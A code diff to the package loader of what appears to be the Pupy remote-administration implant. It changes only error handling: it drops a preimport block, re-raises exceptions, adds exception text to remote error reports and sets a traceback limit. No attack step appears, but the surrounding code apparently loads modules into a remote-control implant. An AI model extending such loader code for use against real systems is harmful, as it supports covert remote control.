@@ -386,21 +386,6 @@ def pupy_add_package(pkdic, compressed=False, name=None):
 
     del module
 
-    if name:
-        try:
-            __import__(name)
-        except:
-            import traceback
-            message = 'Error during preimport {}: {}'.format(
-                name, str(traceback.format_exc()))
-
-            if remote_print_error:
-                remote_print_error(message)
-            else:
-                dprint(message)
-
-    gc.collect()
-
     if __debug__:
         memtrace(name)
 
@@ -589,6 +574,7 @@ class PupyPackageLoader(object):
                         remote_print_error(message)
                     else:
                         dprint(message)
+                    raise
 
             elif self.extension in ('dll', 'pyd', 'so'):
                 if '.' in fullname:
@@ -621,15 +607,16 @@ class PupyPackageLoader(object):
             if remote_print_error:
                 try:
                     dprint('Call remote_print_error() - error loading package {} - start'.format(fullname))
-                    remote_print_error("Error loading package {} ({} pkg={}) : {}".format(
-                        fullname, self.path, self.is_pkg, traceback.format_exc()))
+                    remote_print_error("Error loading package {} ({} pkg={}) : {} {}".format(
+                        fullname, self.path, self.is_pkg, e, traceback.format_exc()))
                     dprint('Call remote_print_error() - error loading package {} - complete'.format(fullname))
                 except:
                     pass
             else:
-                dprint('PupyPackageLoader: Error importing %s : %s'%(fullname, traceback.format_exc()))
+                dprint('PupyPackageLoader: Error importing %s : %s : %s'%(
+                    fullname, e, traceback.format_exc()))
 
-            raise e
+            raise
 
         finally:
             self.contents = None
@@ -881,6 +868,7 @@ def install(debug=None, trace=False):
         )
 
     if __debug__:
+        sys.tracebacklimit=20
         try:
             if __trace:
                 __trace = __import__('tracemalloc')
